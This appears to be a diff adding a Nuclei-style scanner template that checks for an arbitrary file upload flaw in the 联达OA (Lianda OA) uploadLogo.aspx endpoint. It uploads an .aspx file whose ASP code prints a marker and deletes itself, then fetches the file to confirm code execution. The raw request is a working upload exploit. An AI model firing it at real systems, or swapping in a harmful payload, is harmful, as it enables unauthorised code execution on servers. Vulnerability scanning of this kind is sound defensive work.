@@ -1,0 +1,39 @@
+id: liandaOA-uploadLogo-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 联达OA uploadLogo.aspx存在任意文件上传
+  reference:
+    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E8%81%94%E8%BE%BEOA%20uploadLogo.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |-
+        POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 333
+        Content-Type: multipart/form-data; boundary=------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzd{{boundary}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzd{{boundary}}
+        Content-Disposition: form-data; name="DesignId"
+
+        1
+        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzd{{boundary}}
+        Content-Disposition: form-data; name="Filedata";filename="{{filename}}.aspx"
+
+        <% Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51) CreateObject("Scripting.FileSystemObject").DeleteFile(server.mappath(Request.ServerVariables("SCRIPT_NAME"))) %>
+        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzd{{boundary}}--
+      - |+
+        GET /Hosp_Portal/Logo/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
